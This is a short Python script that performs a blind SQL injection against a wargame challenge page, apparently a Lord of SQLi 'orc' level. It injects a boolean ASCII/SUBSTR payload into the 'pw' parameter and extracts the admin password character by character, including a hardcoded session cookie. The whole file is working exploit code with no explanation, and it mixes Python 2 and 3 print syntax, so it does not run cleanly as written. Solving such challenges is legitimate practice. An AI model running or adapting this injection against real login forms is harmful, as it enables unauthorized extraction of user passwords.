import string
from requests import get

cookies=dict(PHPSESSID="vptvkee3h43ptd18bcns6v4o61") #Input Your_Cookie !
idLength=8
url="http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
abc = string.digits + string.ascii_letters

print("\n\n#### Starting Blind SQL Injection ####\n")
result=''
for i in range(1, idLength+1):
    for a in abc:
        param = "?pw=1' or id='admin' and ASCII(SUBSTR(pw, " + str(i) + ", 1))=" + str(ord(a)) + "%23"
        new_url = url + param
        req = get(new_url, cookies=cookies)

        if req.text.find("<h2>Hello admin</h2>") > 0:
            print(str(i) + "st char is '" + a + "'").encode('utf-8')
            result += a
            break
print '='*20
print "result : " + result
